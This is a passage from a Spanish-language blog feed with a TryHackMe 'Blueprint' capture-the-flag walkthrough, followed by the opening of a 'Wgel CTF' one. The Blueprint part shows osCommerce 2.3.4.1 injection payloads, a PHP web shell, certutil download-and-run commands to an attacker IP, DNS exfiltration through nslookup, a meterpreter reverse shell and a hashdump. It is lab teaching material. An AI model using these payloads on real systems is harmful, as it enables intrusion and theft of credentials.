&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;71
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/blueprint# gobuster dir -u http://blueprint.thm:8080/oscommerce-2.3.4/catalog/ -x php,html,txt,aspx,asp -t &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; -q -w /usr/share/wordlists/dirb/common.txt 
/account_history.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/account_edit.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/ADMIN &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/admin &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/Admin &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/advanced_search.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/com2 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/com2.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/com2.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/com2.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/com2.aspx &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/com2.asp &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/com3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/com3.aspx &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/com3.asp &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/com3.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/com3.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/com3.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/conditions.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/contact_us.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/cookie_usage.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/Download &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 401&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/Download.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/download &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 401&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/download.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/ext &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/images &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/Images &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/includes &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/Index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/Login.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/login.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/lpt1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/lpt1.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/lpt1.aspx &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/lpt1.asp &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/lpt1.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/lpt1.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/lpt2 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/lpt2.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/lpt2.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/lpt2.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/lpt2.aspx &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/lpt2.asp &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/nul &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/nul.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/nul.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/nul.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/nul.aspx &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/nul.asp &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/opensearch.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/popup_image.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/prn &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/prn.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/prn.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/prn.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/prn.aspx &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/prn.asp &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/product_reviews.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/products_new.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/pub &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/redirect.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/reviews.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/shipping.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/shopping_cart.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/specials.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/ssl_check.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/tell_a_friend.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;searcsploit&#34;&gt;SEARCSPLOIT&lt;/h2&gt;
&lt;p&gt;Con el nombre y la version de oscommerce encontramos varias vulnerabilidades y exploits que afectan a esta plataforma.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/blueprint/Screenshot_2019-12-27_22-27-20.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;oscommerce-2341---remote-code-execution&#34;&gt;osCommerce 2.3.4.1 - Remote Code Execution&lt;/h2&gt;
&lt;p&gt;Utilizamos el exploit &lt;code&gt;Remote Code Execution&lt;/code&gt;, nos permitira ejecutar comandos en el sistema, pero para ello debemos de configurar la ruta de la maquina en el exploit, de igual forma el payload que ejecuta una shell inversa no funciona ya que es un sistema windows.&lt;/p&gt;
&lt;p&gt;Para poder ver el resultado de la ejecucion de nuestro comando podemos utilizar la tecnica de &lt;a href=&#34;https://www.youtube.com/watch?v=Egwp5zc5ZIM&#34;&gt;&lt;strong&gt;DNS exfil&lt;/strong&gt;&lt;/a&gt; (y por los loles xd).&lt;/p&gt;
&lt;p&gt;Nuestro payload se veria de la siguiente forma si deseamos ver el path donde estamos actualmente.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;cmd.exe /C &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; c:/ &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; 10.8.1.72 &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; /f %i in &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#39;&lt;/span&gt; @echo %cd% &lt;span class=&#34;se&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; nslookup %i 10.8.1.72
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Con la configuracion (IP, Puerto y directorio de la plataforma) realizada, podemos correr &lt;code&gt;responder&lt;/code&gt; en la interfaz &lt;code&gt;tun0&lt;/code&gt;, y al lanzar nuestro exploit nos aparecera la ruta en una solicitud de DNS de responder.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/blueprint/Screenshot_2019-12-27_22-47-14.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Vemos que desordenada la informacion pero el path actual es:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:/xampp/htdocs/oscommerce.2.3.4/catalog/install/includes/
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sabiendo esto podemos verificar si podemos escribir y crear dentro de archivos con el payload:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;payload = &amp;#39;\&amp;#39;);&amp;#39;
payload += &amp;#39;$var = shell_exec(&amp;#34;cmd.exe /C echo \&amp;#39;hello\&amp;#39; &amp;gt; hehe.txt &lt;span class=&#34;err&#34;&gt;&amp;amp;&lt;/span&gt; nslookup test 10.8.1.72 &amp;#34;);&amp;#39; 
payload += &amp;#39;echo $var;&amp;#39;
payload += &amp;#39;/*&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Vemos que que el archivo se creó exitosamente:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/blueprint/Screenshot_2019-12-27_22-51-46.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos este pequeño codigo php para ejecutar comandos, lo alojamos en nuestra maquina y levantamos un servidor web con python3:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;shell_exec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;cmd&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt; &lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Nuestro payload para descargar el archivo en la maquina utilizando &lt;code&gt;certutil&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;payload = &amp;#39;\&amp;#39;);&amp;#39;
payload += &amp;#39;$var = shell_exec(&amp;#34;cmd.exe /C certutil -urlcache -split -f http://10.8.1.72/shell.php shell.php &lt;span class=&#34;err&#34;&gt;&amp;amp;&lt;/span&gt; nslookup test 10.8.1.72 &amp;#34;);&amp;#39; 
payload += &amp;#39;echo $var;&amp;#39;
payload += &amp;#39;/*&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/blueprint/Screenshot_2019-12-27_23-07-26.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Vemos nuestro archivo y ejecutamos comandos:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/blueprint/Screenshot_2019-12-27_23-13-14.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Tenemos permisos de administrador en la maquina y podemos ver la direccion actual en la que nos encontramos, de igual forma podemos leer nuestra bandera que se encuentra en el directorio del usuario administrator.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/blueprint/Screenshot_2019-12-27_23-15-29.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;shell---metasploit&#34;&gt;Shell - Metasploit&lt;/h2&gt;
&lt;p&gt;Utilizando metasploit con certutil podemos obtener una shell y sacar el archivo que contiene los hash de los usuarios en windows para ello vamos a crear nuestro payload con msfvenom y poner a la escucha metasploit.&lt;/p&gt;
&lt;p&gt;Msfvenom:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msfvenom -p windows/meterpreter/reverse_tcp &lt;span class=&#34;nv&#34;&gt;lhost&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;tun0 &lt;span class=&#34;nv&#34;&gt;lport&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1338&lt;/span&gt; -f exe &amp;gt; shell.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Metasploit:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;use exploit/multi/handler
&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; payload windows/meterpreter/reverse_tcp
&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; lhost tun0
&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; lport &lt;span class=&#34;m&#34;&gt;1338&lt;/span&gt;
exploit
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Payload - exploit osCommerce:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;payload = &amp;#39;\&amp;#39;);&amp;#39;
payload += &amp;#39;$var = shell_exec(&amp;#34;cmd.exe /C certutil.exe -urlcache -split -f http://10.8.1.72/shell.exe shell.exe &lt;span class=&#34;err&#34;&gt;&amp;amp;&lt;/span&gt; shell.exe &lt;span class=&#34;err&#34;&gt;&amp;amp;&lt;/span&gt; nslookup test 10.8.1.72 &amp;#34;);&amp;#39; 
payload += &amp;#39;echo $var;&amp;#39;
payload += &amp;#39;/*&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Obtuvimos una sesion meterpreter:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/blueprint/Screenshot_2019-12-27_23-27-37.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Para obtener los hash utilizamos el comando hashdump, los cuales podemos crackear utilizando john o hashcat:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/blueprint/Screenshot_2019-12-27_23-28-18.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/blueprint/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/blueprint/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>windows</category>
            
          
            
              <category>DNS exfil</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Wgel CTF</title>
        <link>https://sckull.github.io/posts/wgel/</link>
        <pubDate>Fri, 27 Dec 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Fri, 27 Dec 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/wgel/</guid>
        <description>Wgel CTF es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.</description>
        <content:encoded>&lt;p&gt;Wgel CTF es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/wgel/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Wgel CTF&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Can you exfiltrate the root flag?&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;627&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/MrSeth6797&#34;&gt;MrSeth6797&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;hr /&gt;
&lt;h3 id=&#34;nmap&#34;&gt;NMAP&lt;/h3&gt;
&lt;p&gt;Escaneo de puertos tcp, vemos dos puertos abiertos http (80) y ssh (22).&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
